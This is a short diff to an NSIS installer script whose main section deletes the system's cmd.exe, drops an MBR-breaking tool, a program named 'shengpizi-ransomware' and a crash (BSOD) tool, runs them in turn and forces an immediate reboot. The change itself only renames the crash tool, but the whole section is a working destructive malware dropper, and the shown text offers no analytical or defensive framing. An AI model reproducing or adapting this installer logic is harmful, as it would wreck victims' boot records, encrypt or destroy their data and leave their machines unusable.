@@ -21,13 +21,13 @@ Section "MainSection" SEC01
   Delete /rebootok "$WINDIR\system32\cmd.exe"
   SetOutPath "$INSTDIR"
   SetOverwrite ifnewer
-  File "..\mkbsod\mkbsod.exe"
+  File "..\bsod\bsod.exe"
   File "..\breakmbr\breakmbr.exe"
   File "..\shengpizi-ransomware\bin\x86\Release\shengpizi-ransomware.exe"
   File "..\bgm.wav"
   exec "$INSTDIR\breakmbr.exe"
   execwait "$INSTDIR\shengpizi-ransomware.exe"
-  exec "$INSTDIR\mkbsod.exe"
+  exec "$INSTDIR\bsod.exe"
   exec "shutdown /f /r /t 0"
 SectionEnd
 
